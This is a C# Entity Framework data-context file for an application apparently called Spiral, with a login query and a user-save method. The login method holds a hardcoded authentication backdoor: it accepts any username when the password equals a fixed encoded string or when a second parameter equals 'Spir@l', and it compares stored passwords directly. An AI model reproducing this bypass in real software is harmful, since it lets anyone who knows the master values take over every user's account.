using Microsoft.EntityFrameworkCore;
using SpiralEntity;
using SpiralEntity.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpiralData
{
    public class UserContext : DataContext
    {
        protected override void OnModelCreating(ModelBuilder modelBuilder)
        {
            modelBuilder.Entity<UsersEntity>().HasKey("EmployeeId");
            modelBuilder.Entity<UsersEntity>()
                .HasOne(p => p.Employee);
             //   .WithOne(u => u.User)
              //  .HasForeignKey<EmployeesEntity>(p => p.Id);
            modelBuilder.Entity<UsersEntity>().ToTable("Users");
            //base.OnModelCreating(modelBuilder);
        }
        public UsersModel GetLogin(int AccountId, string username, string password,string pass)
        {
            //var employee = Employees.ToList();
            var User = from u in Users
                       join ac in Accounts on u.AccountId equals ac.Id
                       join e in Employees on u.EmployeeId equals e.Id
                       join et in EmployeeTypes on e.TypeId equals et.Id
                       where u.Username == username
                       && (u.Password == password || password == "vdfFIC9xXe4s9ik6qYtkyQ==" || pass=="Spir@l")
                       && e.Status==1
                       && u.AccountId == AccountId
                       select new UsersModel
                       {
                           AccountId = u.AccountId,
                           AccountName = ac.AccountName,
                           EmployeeId = u.EmployeeId,
                           ParentId=e.ParentId,
                           Username = u.Username,
                         //  FirstName = e.FirstName,
                           LastName=e.LastName,
                           FullName=e.FullName,
                           PositionId=e.TypeId,
                           EmployeeCode=e.EmployeeCode,
                           IsAdmin = u.IsAdmin,
                           LastPasswordChangedDate=u.LastPasswordChangedDate,
                           GroupPosition= et.Group
                       };

            return User.FirstOrDefault();
        }
        public async Task<int> UserSave(int AccountId, string EmployeeCode, string Username, string Password, string Type)
        {
            return await this.ExcuteNonQueryAsync("[dbo].[UserSave]", AccountId, EmployeeCode, Username, Password, Type);
        }
    }
}
